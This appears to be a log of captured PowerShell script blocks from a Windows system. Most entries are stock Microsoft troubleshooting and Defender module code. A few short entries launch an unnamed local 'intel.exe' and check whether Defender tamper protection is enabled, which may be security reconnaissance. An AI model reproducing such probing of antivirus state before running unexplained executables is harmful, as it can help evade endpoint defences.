Position=0)]\r\n        [Alias('Cn')]\r\n        [ValidateNotNullOrEmpty()]\r\n        [string[]]\r\n        ${ComputerName},\r\n\r\n        [Parameter(ParameterSetName='ComputerName', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='Uri', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathComputerName', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathUri', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='VMId', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='VMName', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathVMId', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathVMName', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]\r\n        [pscredential]\r\n        [System.Management.Automation.CredentialAttribute()]\r\n        ${Credential},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='FilePathComputerName')]\r\n        [Parameter(ParameterSetName='SSHHost')]\r\n        [ValidateRange(1, 65535)]\r\n        [int]\r\n        ${Port},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='FilePathComputerName')]\r\n        [switch]\r\n        ${UseSSL},\r\n\r\n        [Parameter(ParameterSetName='ComputerName', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='Uri', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathComputerName', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathUri', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='ContainerId', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='VMId', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='VMName', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathContainerId', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathVMId', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathVMName', ValueFromPipelineByPropertyName=$true)]\r\n        [string]\r\n        ${ConfigurationName},\r\n\r\n        [Parameter(ParameterSetName='ComputerName', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathComputerName', ValueFromPipelineByPropertyName=$true)]\r\n        [string]\r\n        ${ApplicationName},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='Session')]\r\n        [Parameter(ParameterSetName='Uri')]\r\n        [Parameter(ParameterSetName='FilePathComputerName')]\r\n        [Parameter(ParameterSetName='FilePathRunspace')]\r\n        [Parameter(ParameterSetName='FilePathUri')]\r\n        [Parameter(ParameterSetName='VMId')]\r\n        [Parameter(ParameterSetName='VMName')]\r\n        [Parameter(ParameterSetName='ContainerId')]\r\n        [Parameter(ParameterSetName='FilePathVMId')]\r\n        [Parameter(ParameterSetName='FilePathVMName')]\r\n        [Parameter(ParameterSetName='FilePathContainerId')]\r\n        [int]\r\n        ${ThrottleLimit},\r\n\r\n        [Parameter(ParameterSetName='Uri', Position=0)]\r\n        [Parameter(ParameterSetName='FilePathUri', Position=0)]\r\n        [Alias('URI','CU')]\r\n        [ValidateNotNullOrEmpty()]\r\n        [uri[]]\r\n        ${ConnectionUri},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='Session')]\r\n        [Parameter(ParameterSetName='Uri')]\r\n        [Parameter(ParameterSetName='FilePathComputerName')]\r\n        [Parameter(ParameterSetName='FilePathRunspace')]\r\n        [Parameter(ParameterSetName='FilePathUri')]\r\n        [Parameter(ParameterSetName='VMId')]\r\n        [Parameter(ParameterSetName='VMName')]\r\n        [Parameter(ParameterSetName='ContainerId')]\r\n        [Parameter(ParameterSetName='FilePathVMId')]\r\n        [Parameter(ParameterSetName='FilePathVMName')]\r\n        [Parameter(ParameterSetName='FilePathContainerId')]\r\n        [Parameter(ParameterSetName='SSHHost')]\r\n        [Parameter(ParameterSetName='SSHHostHashParam')]\r\n        [Parameter(ParameterSetName='FilePathSSHHost')]\r\n        [Parameter(ParameterSetName='FilePathSSHHostHash')]\r\n        [switch]\r\n        ${AsJob},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='FilePathComputerName')]\r\n        [Parameter(ParameterSetName='Uri')]\r\n        [Parameter(ParameterSetName='FilePathUri')]\r\n        [Alias('Disconnected')]\r\n        [switch]\r\n        ${InDisconnectedSession},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='FilePathComputerName')]\r\n        [ValidateNotNullOrEmpty()]\r\n        [string[]]\r\n        ${SessionName},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='Session')]\r\n        [Parameter(ParameterSetName='Uri')]\r\n        [Parameter(ParameterSetName='FilePathComputerName')]\r\n        [Parameter(ParameterSetName='FilePathRunspace')]\r\n        [Parameter(ParameterSetName='FilePathUri')]\r\n        [Parameter(ParameterSetName='VMId')]\r\n        [Parameter(ParameterSetName='VMName')]\r\n        [Parameter(ParameterSetName='ContainerId')]\r\n        [Parameter(ParameterSetName='FilePathVMId')]\r\n        [Parameter(ParameterSetName='FilePathVMName')]\r\n        [Parameter(ParameterSetName='FilePathContainerId')]\r\n        [Parameter(ParameterSetName='SSHHost')]\r\n        [Parameter(ParameterSetName='SSHHostHashParam')]\r\n        [Parameter(ParameterSetName='FilePathSSHHost')]\r\n        [Parameter(ParameterSetName='FilePathSSHHostHash')]\r\n        [Alias('HCN')]\r\n        [switch]\r\n        ${HideComputerName},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='Session')]\r\n        [Parameter(ParameterSetName='Uri')]\r\n        [Parameter(ParameterSetName='FilePathComputerName')]\r\n        [Parameter(ParameterSetName='FilePathRunspace')]\r\n        [Parameter(ParameterSetName='FilePathUri')]\r\n        [Parameter(ParameterSetName='ContainerId')]\r\n        [Parameter(ParameterSetName='FilePathContainerId')]\r\n        [Parameter(ParameterSetName='SSHHostHashParam')]\r\n        [Parameter(ParameterSetName='SSHHost')]\r\n        [string]\r\n        ${JobName},\r\n\r\n        [Parameter(ParameterSetName='ComputerName', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='Session', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='Uri', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='InProcess', Mandatory=$true, Position=0)]\r\n        [Parameter(ParameterSetName='VMId', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='VMName', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='ContainerId', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='SSHHost', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='SSHHostHashParam', Mandatory=$true, Position=1)]\r\n        [Alias('Command')]\r\n        [ValidateNotNull()]\r\n        [scriptblock]\r\n        ${ScriptBlock},\r\n\r\n        [Parameter(ParameterSetName='InProcess')]\r\n        [switch]\r\n        ${NoNewScope},\r\n\r\n        [Parameter(ParameterSetName='FilePathComputerName', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='FilePathRunspace', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='FilePathUri', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='FilePathVMId', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='FilePathVMName', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='FilePathContainerId', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='FilePathSSHHost', Mandatory=$true)]\r\n        [Parameter(ParameterSetName='FilePathSSHHostHash', Mandatory=$true)]\r\n        [Alias('PSPath')]\r\n        [ValidateNotNull()]\r\n        [string]\r\n        ${FilePath},\r\n\r\n        [Parameter(ParameterSetName='Uri')]\r\n        [Parameter(ParameterSetName='FilePathUri')]\r\n        [switch]\r\n        ${AllowRedirection},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='Uri')]\r\n        [Parameter(ParameterSetName='FilePathComputerName')]\r\n        [Parameter(ParameterSetName='FilePathUri')]\r\n        [System.Management.Automation.Remoting.PSSessionOption]\r\n        ${SessionOption},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='FilePathComputerName')]\r\n        [Parameter(ParameterSetName='Uri')]\r\n        [Parameter(ParameterSetName='FilePathUri')]\r\n        [System.Management.Automation.Runspaces.AuthenticationMechanism]\r\n        ${Authentication},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='FilePathComputerName')]\r\n        [Parameter(ParameterSetName='Uri')]\r\n        [Parameter(ParameterSetName='FilePathUri')]\r\n        [switch]\r\n        ${EnableNetworkAccess},\r\n\r\n        [Parameter(ParameterSetName='ContainerId')]\r\n        [Parameter(ParameterSetName='FilePathContainerId')]\r\n        [switch]\r\n        ${RunAsAdministrator},\r\n\r\n        [Parameter(ParameterSetName='SSHHost', Mandatory=$true)]\r\n        [Parameter(ParameterSetName='FilePathSSHHost', Mandatory=$true)]\r\n        [ValidateNotNullOrEmpty()]\r\n        [string[]]\r\n        ${HostName},\r\n\r\n        [Parameter(ParameterSetName='SSHHost')]\r\n        [Parameter(ParameterSetName='FilePathSSHHost')]\r\n        [ValidateNotNullOrEmpty()]\r\n        [string]\r\n        ${UserName},\r\n\r\n        [Parameter(ParameterSetName='SSHHost')]\r\n        [Parameter(ParameterSetName='FilePathSSHHost')]\r\n        [Alias('IdentityFilePath')]\r\n        [ValidateNotNullOrEmpty()]\r\n        [string]\r\n        ${KeyFilePath},\r\n\r\n        [Parameter(ParameterSetName='SSHHost')]\r\n        [Parameter(ParameterSetName='FilePathSSHHost')]\r\n        [string]\r\n        ${Subsystem},\r\n\r\n        [Parameter(ParameterSetName='SSHHost')]\r\n        [Parameter(ParameterSetName='FilePathSSHHost')]\r\n        [int]\r\n        ${ConnectingTimeout},\r\n\r\n        [Parameter(ParameterSetName='SSHHost')]\r\n        [Parameter(ParameterSetName='FilePathSSHHost')]\r\n        [ValidateSet('true')]\r\n        [switch]\r\n        ${SSHTransport},\r\n\r\n        [Parameter(ParameterSetName='SSHHostHashParam', Mandatory=$true)]\r\n        [Parameter(ParameterSetName='FilePathSSHHostHash', Mandatory=$true)]\r\n        [ValidateNotNullOrEmpty()]\r\n        [hashtable[]]\r\n        ${SSHConnection},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='Session')]\r\n        [Parameter(ParameterSetName='Uri')]\r\n        [Parameter(ParameterSetName='FilePathComputerName')]\r\n        [Parameter(ParameterSetName='FilePathRunspace')]\r\n        [Parameter(ParameterSetName='FilePathUri')]\r\n        [Parameter(ParameterSetName='VMId')]\r\n        [Parameter(ParameterSetName='VMName')]\r\n        [Parameter(ParameterSetName='ContainerId')]\r\n        [Parameter(ParameterSetName='FilePathVMId')]\r\n        [Parameter(ParameterSetName='FilePathVMName')]\r\n        [Parameter(ParameterSetName='FilePathContainerId')]\r\n        [Parameter(ParameterSetName='SSHHost')]\r\n        [Parameter(ParameterSetName='SSHHostHashParam')]\r\n        [Parameter(ParameterSetName='FilePathSSHHost')]\r\n        [Parameter(ParameterSetName='FilePathSSHHostHash')]\r\n        [switch]\r\n        ${RemoteDebug},\r\n\r\n        [Parameter(ValueFromPipeline=$true)]\r\n        [psobject]\r\n        ${InputObject},\r\n\r\n        [Alias('Args')]\r\n        [System.Object[]]\r\n        ${ArgumentList},\r\n\r\n        [Parameter(ParameterSetName='VMId', Mandatory=$true, Position=0, ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathVMId', Mandatory=$true, Position=0, ValueFromPipelineByPropertyName=$true)]\r\n        [Alias('VMGuid')]\r\n        [ValidateNotNullOrEmpty()]\r\n        [guid[]]\r\n        ${VMId},\r\n\r\n        [Parameter(ParameterSetName='VMName', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathVMName', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]\r\n        [ValidateNotNullOrEmpty()]\r\n        [string[]]\r\n        ${VMName},\r\n\r\n        [Parameter(ParameterSetName='ContainerId', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathContainerId', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]\r\n        [ValidateNotNullOrEmpty()]\r\n        [string[]]\r\n        ${ContainerId},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='Uri')]\r\n        [string]\r\n        ${CertificateThumbprint})\r\n\r\n    begin\r\n    {\r\n        try {\r\n            Test-Caller -CallStack (Get-PSCallStack)\r\n            $outBuffer = $null\r\n            if ($PSBoundParameters.TryGetValue('OutBuffer', [ref]$outBuffer))\r\n            {\r\n                $PSBoundParameters['OutBuffer'] = 1\r\n            }\r\n\r\n            $wrappedCmd = $ExecutionContext.InvokeCommand.GetCommand('Microsoft.PowerShell.Core\\Invoke-Command', [System.Management.Automation.CommandTypes]::Cmdlet)\r\n            $scriptCmd = {& $wrappedCmd @PSBoundParameters }\r\n\r\n            $steppablePipeline = $scriptCmd.GetSteppablePipeline($myInvocation.CommandOrigin)\r\n            $steppablePipeline.Begin($PSCmdlet)\r\n        } catch {\r\n            throw\r\n        }\r\n    }\r\n\r\n    process\r\n    {\r\n        try {\r\n            $steppablePipeline.Process($_)\r\n        } catch {\r\n            throw\r\n        }\r\n    }\r\n\r\n    end\r\n    {\r\n        try {\r\n            $steppablePipeline.End()\r\n        } catch {\r\n            throw\r\n        }\r\n    }\r\n    <#\r\n\r\n    .ForwardHelpTargetName Microsoft.PowerShell.Core\\Invoke-Command\r\n    .ForwardHelpCategory Cmdlet\r\n\r\n    #>\r\n\r\n}\r\n\r\n# Exporting function overrides\r\nExport-ModuleMember -Function @(\r\n    'Invoke-Expression'\r\n    'Invoke-Command'\r\n)"
"& 'C:\\Windows\\TEMP\\SDIAG_5d714a56-ed76-4941-ae1e-d3b1d5312085\\TS_DiagnosticHistory.ps1'"
"# Copyright © 2008, Microsoft Corporation. All rights reserved.\r\n\r\ntrap {break}\r\n\r\n# Include common library\r\n. .\\CL_Utility.ps1\r\n\r\nImport-LocalizedData -BindingVariable localizationString -FileName CL_LocalizationData\r\n\r\n# function library\r\n# Function to check whether have unnecessary files\r\nfunction Test-UnnecessaryFiles([string]$folder = $(throw \"No folder is specified\")) {\r\n    if([String]::IsNullOrEmpty($folder) -or (-not(Test-Path $folder))) {\r\n        return $false\r\n    }\r\n\r\n    [int]$threshold = -1\r\n    $folders = Get-ChildItem -literalPath $folder -Recurse -Force | Where-Object {($_.PSIsContainer) -and ((($_.CreationTime).CompareTo((Get-Date).AddMonths($threshold))) -lt 0)}\r\n\r\n    return ($folders -ne $null)\r\n}\r\n\r\n# Check troubleshooting history\r\nWrite-DiagProgress -Activity $localizationString.CheckTSHistory\r\n\r\n[string]$userTSHistoryPath = Get-UserTSHistoryPath\r\n[string]$adminTSHistoryPath = Get-AdminTSHistoryPath\r\n[double]$userTSHistorySize = (Get-FolderSize $userTSHistoryPath)\r\n[double]$adminTSHistorySize = (Get-FolderSize $adminTSHistoryPath)\r\n[double]$totalSize = Format-DiskSpaceMB ($userTSHistorySize + $adminTSHistorySize)\r\n\r\n# Reporting\r\n@{Name=$userTSHistoryPath;Space=$userTSHistorySize} | Select-Object -Property @{Name=$localizationString.userTSHistoryPath;Expression={$_.Name}},@{Name=$localizationString.userTSHistorySize;Expression={(Format-DiskSpaceMB $_.Space) + \"MB\"}} | ConvertTo-Xml | Update-DiagReport -id UserTSHistorySizeInfo -Name $localizationString.UserTSHistoryInfo_name -Description $localizationString.UserTSHistoryInfo_description -rid \"RC_DiagnosticHistory\"\r\n\r\n@{Name=$adminTSHistoryPath;Space=$adminTSHistorySize} | Select-Object -Property @{Name=$localizationString.adminTSHistoryPath;Expression={$_.Name}},@{Name=$localizationString.adminTSHistorySize;Expression={(Format-DiskSpaceMB $_.Space) + \"MB\"}} | ConvertTo-Xml | Update-DiagReport -id AdminTSHistorySizeInfo -Name $localizationString.AdminTSHistoryInfo_name -Description $localizationString.AdminTSHistoryInfo_description -rid \"RC_DiagnosticHistory\"\r\n\r\n\r\nif(Test-UnnecessaryFiles $userTSHistoryPath) {\r\n    Update-DiagRootcause -ID \"RC_DiagnosticHistory\" -Detected $true -Parameter @{'UnwantedSpace'=(Format-DiskSpaceMB $totalSize)}\r\n    return\r\n}\r\n\r\nif(Test-UnnecessaryFiles $adminTSHistoryPath) {\r\n    Update-DiagRootcause -ID \"RC_DiagnosticHistory\" -Detected $true -Parameter @{'UnwantedSpace'=(Format-DiskSpaceMB $totalSize)}\r\n    return\r\n}\r\n\r\nUpdate-DiagRootcause -ID \"RC_DiagnosticHistory\" -Detected $false -Parameter @{'UnwantedSpace'=(Format-DiskSpaceMB $totalSize)}\r\n"
"# Localized\t12/07/2019 05:47 AM (GMT)\t303:6.40.20520 \tCL_LocalizationData.psd1\r\nConvertFrom-StringData @'\r\n###PSLOC\r\nfilesFailToRemove_description=Exceptions caught while removing files.\r\ncheckBrokenDesktopShortcuts_progress=Checking for broken shortcuts...\r\ncheckBrokenStartupShortcuts_progress=Checking for broken startup links...\r\nbrokenDesktopShortcuts_name=Broken desktop shortcuts\r\nbrokenDesktopShortcuts_description=List of desktop shortcuts for which the target executable no longer exists.\r\nbrokenStartupShortcuts_name=Broken startup shortcuts\r\nbrokenStartupShortcuts_description=List of startup shortcuts for which the target executable no longer exists.\r\ndeleteBrokenDesktopShortcuts_progress=Deleting broken shortcuts...\r\ndeleteBrokenStartupShortcuts_progress=Deleting broken startup links...\r\ncheckSystemTime_progress=Checking clock time...\r\nsyncSystemTime_progress=Synchronizing clock time...\r\ntimeDelayAgainstTimeServer_name=Clock synchronization\r\ncheckUnusedDesktopIcons_progress=Checking for unused desktop icons...\r\nunusedDesktopShortcuts_name=Unused desktop shortcuts\r\nunusedDesktopShortcuts_description=List of shortcuts that have not been recently accessed for\r\nunusedTimeUnit=months.\r\ndeleteUnusedDesktopShortcuts_progress=Deleting unused shortcuts...\r\ntimeServerName=Time server name\r\nsamplesCollected=Samples collected\r\nserverTime=Server time\r\nlocalTime=Local time\r\ntimeDifference=Time difference\r\nshortcutName=Shortcut name\r\nCheckWERQueue=Checking for unnecessary files...\r\nDeleteUserWERQueue=Deleting Windows error reports...\r\nDeleteSystemWERQueue=Deleting Windows error reports...\r\nCheckTSHistory=Checking for unnecessary files...\r\nDeleteUserTSHistory=Deleting troubleshooting history...\r\nDeleteAdminTSHistory=Deleting troubleshooting history...\r\nfreeSpace=Free space\r\ntotalSpace=Total space\r\ndriveName=Drive name\r\nsystemDriveInfo_name=Disk information\r\nsystemDriveInfo_description=Details of the system drive.\r\nUserReportInfo_name=User Report details\r\nUserReportInfo_description=Details of the Windows error reporting user queue.\r\nuserReportPath=Folder name\r\nuserReportSpace=Disk space\r\nMachineReportInfo_name=System report details\r\nMachineReportInfo_description=Details of the Windows error reporting system queue.\r\nMachineReportPath=Folder name\r\nMachineReportSpace=Disk space\r\nreclaimedUserReportSize=Reclaimed space\r\nReclaimedUserReportInfo_name=Deleted user reports\r\nReclaimedUserReportInfo_description=Details of the updated Windows error reporting user queue.\r\nreclaimedMachineReportSize=Reclaimed space\r\nReclaimedMachineReportInfo_name=Deleted system reports\r\nReclaimedMachineReportInfo_description=Details of the updated Windows error reporting system queue.\r\nuserTSHistoryPath=Folder name\r\nadminTSHistoryPath=Folder name\r\nUserTSHistoryInfo_name=User troubleshooting history details\r\nUserTSHistoryInfo_description=Details of the user troubleshooting history logs.\r\nAdminTSHistoryInfo_name=Administrator troubleshooting history details\r\nAdminTSHistoryInfo_description=Details of the administrator troubleshooting history logs.\r\nReclaimedUserTSHistroyInfo_name=Deleted user troubleshooting history\r\nReclaimedUserTSHistroyInfo_description=Details of the updated user troubleshooting history folder.\r\nReclaimedAdminTSHistroyInfo_name=Deleted administrator troubleshooting history\r\nReclaimedAdminTSHistroyInfo_description=Details of the updated administrator troubleshooting history folder.\r\nuserTSHistorySize=Disk space\r\nadminTSHistorySize=Disk space\r\n###PSLOC\r\n'@\r\n"
"# Localized\t12/07/2019 05:47 AM (GMT)\t303:6.40.20520 \tCL_LocalizationData.psd1\r\nConvertFrom-StringData @'\r\n###PSLOC\r\nfilesFailToRemove_description=Exceptions caught while removing files.\r\ncheckBrokenDesktopShortcuts_progress=Checking for broken shortcuts...\r\ncheckBrokenStartupShortcuts_progress=Checking for broken startup links...\r\nbrokenDesktopShortcuts_name=Broken desktop shortcuts\r\nbrokenDesktopShortcuts_description=List of desktop shortcuts for which the target executable no longer exists.\r\nbrokenStartupShortcuts_name=Broken startup shortcuts\r\nbrokenStartupShortcuts_description=List of startup shortcuts for which the target executable no longer exists.\r\ndeleteBrokenDesktopShortcuts_progress=Deleting broken shortcuts...\r\ndeleteBrokenStartupShortcuts_progress=Deleting broken startup links...\r\ncheckSystemTime_progress=Checking clock time...\r\nsyncSystemTime_progress=Synchronizing clock time...\r\ntimeDelayAgainstTimeServer_name=Clock synchronization\r\ncheckUnusedDesktopIcons_progress=Checking for unused desktop icons...\r\nunusedDesktopShortcuts_name=Unused desktop shortcuts\r\nunusedDesktopShortcuts_description=List of shortcuts that have not been recently accessed for\r\nunusedTimeUnit=months.\r\ndeleteUnusedDesktopShortcuts_progress=Deleting unused shortcuts...\r\ntimeServerName=Time server name\r\nsamplesCollected=Samples collected\r\nserverTime=Server time\r\nlocalTime=Local time\r\ntimeDifference=Time difference\r\nshortcutName=Shortcut name\r\nCheckWERQueue=Checking for unnecessary files...\r\nDeleteUserWERQueue=Deleting Windows error reports...\r\nDeleteSystemWERQueue=Deleting Windows error reports...\r\nCheckTSHistory=Checking for unnecessary files...\r\nDeleteUserTSHistory=Deleting troubleshooting history...\r\nDeleteAdminTSHistory=Deleting troubleshooting history...\r\nfreeSpace=Free space\r\ntotalSpace=Total space\r\ndriveName=Drive name\r\nsystemDriveInfo_name=Disk information\r\nsystemDriveInfo_description=Details of the system drive.\r\nUserReportInfo_name=User Report details\r\nUserReportInfo_description=Details of the Windows error reporting user queue.\r\nuserReportPath=Folder name\r\nuserReportSpace=Disk space\r\nMachineReportInfo_name=System report details\r\nMachineReportInfo_description=Details of the Windows error reporting system queue.\r\nMachineReportPath=Folder name\r\nMachineReportSpace=Disk space\r\nreclaimedUserReportSize=Reclaimed space\r\nReclaimedUserReportInfo_name=Deleted user reports\r\nReclaimedUserReportInfo_description=Details of the updated Windows error reporting user queue.\r\nreclaimedMachineReportSize=Reclaimed space\r\nReclaimedMachineReportInfo_name=Deleted system reports\r\nReclaimedMachineReportInfo_description=Details of the updated Windows error reporting system queue.\r\nuserTSHistoryPath=Folder name\r\nadminTSHistoryPath=Folder name\r\nUserTSHistoryInfo_name=User troubleshooting history details\r\nUserTSHistoryInfo_description=Details of the user troubleshooting history logs.\r\nAdminTSHistoryInfo_name=Administrator troubleshooting history details\r\nAdminTSHistoryInfo_description=Details of the administrator troubleshooting history logs.\r\nReclaimedUserTSHistroyInfo_name=Deleted user troubleshooting history\r\nReclaimedUserTSHistroyInfo_description=Details of the updated user troubleshooting history folder.\r\nReclaimedAdminTSHistroyInfo_name=Deleted administrator troubleshooting history\r\nReclaimedAdminTSHistroyInfo_description=Details of the updated administrator troubleshooting history folder.\r\nuserTSHistorySize=Disk space\r\nadminTSHistorySize=Disk space\r\n###PSLOC\r\n'@\r\n"
"function Get-UserTSHistoryPath {\r\n    return \"${env:localappdata}\\diagnostics\"\r\n}"
"function Get-AdminTSHistoryPath {\r\n    return \"${env:localappdata}\\elevateddiagnostics\"\r\n}"
"{$_.Name}"
"{(Format-DiskSpaceMB $_.Space) + \"MB\"}"
"{$_.Name}"
"{(Format-DiskSpaceMB $_.Space) + \"MB\"}"
"function Test-UnnecessaryFiles([string]$folder = $(throw \"No folder is specified\")) {\r\n    if([String]::IsNullOrEmpty($folder) -or (-not(Test-Path $folder))) {\r\n        return $false\r\n    }\r\n\r\n    [int]$threshold = -1\r\n    $folders = Get-ChildItem -literalPath $folder -Recurse -Force | Where-Object {($_.PSIsContainer) -and ((($_.CreationTime).CompareTo((Get-Date).AddMonths($threshold))) -lt 0)}\r\n\r\n    return ($folders -ne $null)\r\n}"
"dir"
"prompt"
"& \"./intel.exe\""
"{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"{ Set-StrictMode -Version 1; $_.OriginInfo }"
"prompt"
"dir"
"prompt"
"Get-MpComputerStatus | select IsTamperProtected"
"\r\n#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpComputerStatus'\r\n$script:ClassVersion = ''\r\n$script:ModuleVersion = '1.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Get-MpComputerStatus\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\r\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpComputerStatus')]\r\n\r\n    param(\r\n    \r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\r\n\r\n\r\n    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_MpComputerStatus.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-MpComputerStatus' -Alias '*'\r\n        \r\n"
